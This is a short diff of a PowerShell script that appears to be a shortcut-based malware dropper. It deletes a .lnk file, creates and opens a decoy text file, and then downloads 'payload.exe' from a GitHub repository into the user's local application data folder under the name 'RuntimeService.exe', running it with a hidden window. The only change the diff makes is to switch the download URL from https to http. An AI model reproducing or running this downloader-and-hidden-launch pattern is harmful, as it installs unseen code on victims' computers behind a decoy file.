@@ -2,5 +2,5 @@ Remove-Item file.txt.lnk
 New-Item file.txt
 Set-Content file.txt "Any text"
 Start-Process -FilePath file.txt
-(New-Object System.Net.WebClient).DownloadFile("https://github.com/Rewarny/test/raw/main/payload.exe", "$($env:LOCALAPPDATA)\RuntimeService.exe")
+(New-Object System.Net.WebClient).DownloadFile("http://github.com/Rewarny/test/raw/main/payload.exe", "$($env:LOCALAPPDATA)\RuntimeService.exe")
 Start-Process -WindowStyle hidden -FilePath "$($env:LOCALAPPDATA)\RuntimeService.exe"
